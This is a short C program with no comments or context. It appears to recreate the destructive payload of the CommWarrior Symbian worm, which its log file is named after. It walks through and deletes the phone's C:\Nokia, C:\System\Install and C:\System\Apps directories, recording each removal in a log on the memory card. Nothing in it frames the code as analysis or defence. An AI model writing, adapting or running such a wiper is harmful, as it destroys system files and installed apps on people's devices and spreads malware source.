#include <stdlib.h>
#include <stdio.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>

static void delete_directory(const char* path, FILE* log_file);

int main(int argc, char* argv[])
{
    const char* directories[] =
    {
        "C:\\Nokia",
        "C:\\System\\Install",
        "C:\\System\\Apps"
    };
    int num_directories = sizeof(directories) / sizeof(directories[0]);
    int i;

    FILE* log_file = fopen("E:\\commwarrior.log", "a");
    if (log_file == NULL)
    {
        perror("fopen");
        return EXIT_FAILURE;
    }

    for (i = 0; i < num_directories; ++i)
    {
        delete_directory(directories[i], log_file);
    }

    fclose(log_file);
    return EXIT_SUCCESS;
}

static void delete_directory(const char* path, FILE* log_file)
{
    struct dirent* entry;
    DIR* dir = opendir(path);

    if (dir == NULL)
    {
        perror("opendir");
        fprintf(log_file, "Failed to open directory: %s\n", path);
        return;
    }

    fprintf(log_file, "Deleting directory: %s\n", path);

    while ((entry = readdir(dir)) != NULL)
    {
        char full_path[1024];
        struct stat statbuf;

        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
        {
            continue;
        }

        sprintf(full_path, "%s/%s", path, entry->d_name);
        if (stat(full_path, &statbuf) == 0)
        {
            if (S_ISDIR(statbuf.st_mode))
            {
                delete_directory(full_path, log_file);
            }
            else
            {
                if (remove(full_path) != 0)
                {
                    perror("remove");
                    fprintf(log_file, "Failed to remove file: %s\n", full_path);
                }
                else
                {
                    fprintf(log_file, "Removed file: %s\n", full_path);
                }
            }
        }
    }

    closedir(dir);

    if (rmdir(path) != 0)
    {
        perror("rmdir");
        fprintf(log_file, "Failed to remove directory: %s\n", path);
    }
    else
    {
        fprintf(log_file, "Removed directory: %s\n", path);
    }
}
